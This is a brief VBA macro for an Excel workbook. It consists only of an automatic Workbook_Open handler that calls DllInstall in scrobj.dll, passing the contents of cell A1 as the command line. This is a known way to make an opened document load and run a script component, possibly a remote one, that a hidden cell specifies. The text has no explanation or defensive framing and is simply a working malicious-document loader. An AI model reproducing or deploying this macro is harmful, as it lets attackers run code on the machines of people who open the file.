Private Declare PtrSafe Function DllInstall Lib "scrobj.dll" (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long

Sub inst()
    DllInstall False, ByVal StrPtr(Sheet1.Range("A1").Value)
End Sub
Sub Workbook_Open()
    inst
End Sub
